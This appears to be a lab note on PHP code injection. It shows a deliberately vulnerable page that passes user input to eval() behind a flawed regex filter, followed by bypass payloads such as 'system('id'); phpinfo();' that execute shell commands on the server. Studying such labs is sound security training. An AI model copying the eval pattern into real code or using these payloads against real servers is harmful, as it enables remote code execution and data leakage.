# code-
<!DOCTYPE html>

<html>

<head>

<title>Code Injection</title>

</head>

<body>

  

<form action="code-injection9.php" method="POST">

Function:

<input type="text" name="fun"><br />

<input type="submit" name="run" value="run">

</form>

  

<pre>

<?php

  

if (isset($_POST['fun'])) {

  

$fun = $_POST['fun'];

  

// Allow only functions starting with phpinfo or print_r

if (preg_match('/^phpinfo|print_r/', $fun)) {

  

// ❌ Dangerous: Executes user input

eval($fun . ";");

  

} else {

echo "Error";

}

}

  

?>

</pre>

  

</body>

</html>


# bypass=
## 📄 Screenshot 5 — Explanation Panel (From Image)

### Example:

`system('id'); phpinfo();`

### Explanation:

- `system('id')` → shows system user info
    
- `phpinfo()` → displays PHP configuration
    

🧠 **Order matters**, but **risk remains the same**

---

### Another Example:

`print_r($_POST); system('id');`

📌 **Security Impact**

- Leaks POST data
    
- Executes system command
    
- Reveals server environment